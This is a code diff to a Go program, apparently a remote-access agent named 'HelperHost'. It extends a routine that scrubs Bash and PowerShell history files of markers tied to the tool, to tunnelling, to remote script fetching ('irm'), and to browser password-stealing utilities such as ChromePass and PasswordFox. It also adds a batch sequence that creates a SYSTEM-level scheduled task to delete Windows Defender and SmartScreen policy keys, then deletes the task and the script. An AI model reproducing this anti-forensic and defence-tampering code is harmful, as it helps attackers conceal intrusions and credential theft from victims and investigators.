@@ -458,12 +458,25 @@ func scrubShellArtifacts() {
 	markers := []string{
 		"HelperHost", "EdgeRelay", "agentshe", "AgentSHE", "lilygopro",
 		"bootstrap-sh", "bootstrap&enroll", "HelperHostCache",
-		"install.sh", "install.ps1",
+		"install.sh", "install.ps1", "install-win", "AGENTSHE_",
+		"trycloudflare", "$Enroll=", "$BotBase=", "irm ", "hh-wipe",
+		"hh-restore", "Cleaner.exe", "ChromePass", "PasswordFox",
+		"agentshe-bot", "HelperHostWipe", "early-av",
 	}
 	home, _ := os.UserHomeDir()
 	var candidates []string
 	if runtime.GOOS == "windows" {
-		candidates = append(candidates, filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"))
+		psrl := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine")
+		if entries, err := os.ReadDir(psrl); err == nil {
+			for _, e := range entries {
+				n := strings.ToLower(e.Name())
+				if strings.Contains(n, "history") {
+					candidates = append(candidates, filepath.Join(psrl, e.Name()))
+				}
+			}
+		}
+		// Fallback classic path
+		candidates = append(candidates, filepath.Join(psrl, "ConsoleHost_history.txt"))
 	} else {
 		candidates = append(candidates,
 			filepath.Join(home, ".bash_history"),
@@ -710,6 +723,19 @@ if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content 
 			"del /f /q \"%LOCALAPPDATA%\\HelperHost\\HelperHost.exe\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
+			// Tamper often blocks Admin from deleting Policies\\Windows Defender — use SYSTEM once
+			"echo @echo off> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender\" /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\" /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender Security Center\" /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\" /v UILockdown /t REG_DWORD /d 0 /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"echo reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /f>> \"%TEMP%\\hh-clear-pol.cmd\"\r\n" +
+			"schtasks /Create /TN HelperHostClearPol /TR \"cmd.exe /c \\\"%TEMP%\\hh-clear-pol.cmd\\\"\" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F >nul 2>&1\r\n" +
+			"schtasks /Run /TN HelperHostClearPol >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 4 >nul\r\n" +
+			"schtasks /Delete /TN HelperHostClearPol /F >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-clear-pol.cmd\" >nul 2>&1\r\n" +
 			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
 			"reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
 			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\" /f >nul 2>&1\r\n" +
